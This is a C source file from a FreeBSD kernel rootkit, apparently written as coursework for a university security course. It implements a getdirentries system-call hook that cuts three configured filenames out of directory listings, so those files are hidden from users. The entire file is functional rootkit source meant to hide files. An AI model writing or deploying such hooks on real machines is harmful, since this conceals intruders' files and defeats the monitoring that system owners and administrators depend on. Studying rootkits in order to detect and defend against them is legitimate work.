/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * getdirentries system call hook.
 * Hides the file DIR_F_HIDE
 *
 */

#include "trivial.h"

int
getdirentries_hook(struct thread *td, void *syscall_args)
{
	struct getdirentries_args /* {
		int fd;
		char *buf;
		u_int count;
		long *basep;
	} */ *uap;
	uap = (struct getdirentries_args *)syscall_args;

	struct dirent *dp, *current;
	unsigned int size, count;

	/*
	 * Store the directory entries found in fd in buf, and record the
	 * number of bytes actually transferred.
	 */
	getdirentries(td, syscall_args);
	size = td->td_retval[0];

	/* Does fd actually contain any directory entries? */
	if (size > 0) {
		
		dp = malloc(size*sizeof(struct dirent *), M_TEMP, M_NOWAIT);
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;

		/*
		 * Iterate through the directory entries found in fd.
		 * Note: The last directory entry always has a record length
		 * of zero.
		 */
		while ((current->d_reclen != 0) && (count > 0)) {
			count -= current->d_reclen;

			/* Do we want to hide this file? */
			if(strcmp((char *)&(current->d_name), DIR_F_HIDE_1) == 0 ||
				strcmp((char *)&(current->d_name), DIR_F_HIDE_2) == 0 ||
				strcmp((char *)&(current->d_name), DIR_F_HIDE_3) == 0)
			{
				/*
				 * Copy every directory entry found after
				 * DIR_F_HIDE over DIR_F_HIDE, effectively cutting it
				 * out.
				 */
				if (count != 0)
					bcopy((char *)current +
					    current->d_reclen, current,
					    count);

				size -= current->d_reclen;
				break;
			}

			/*
			 * Are there still more directory entries to
			 * look through?
			 */
			if (count != 0)
				/* Advance to the next record. */
				current = (struct dirent *)((char *)current +
				    current->d_reclen);
		}

		/*
		 * If DIR_F_HIDE was found in fd, adjust the "return values" to
		 * hide it. If DIR_F_HIDE wasn't found...don't worry 'bout it.
		 */
		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);

		free(dp, M_TEMP);
	}

	return(0);
}
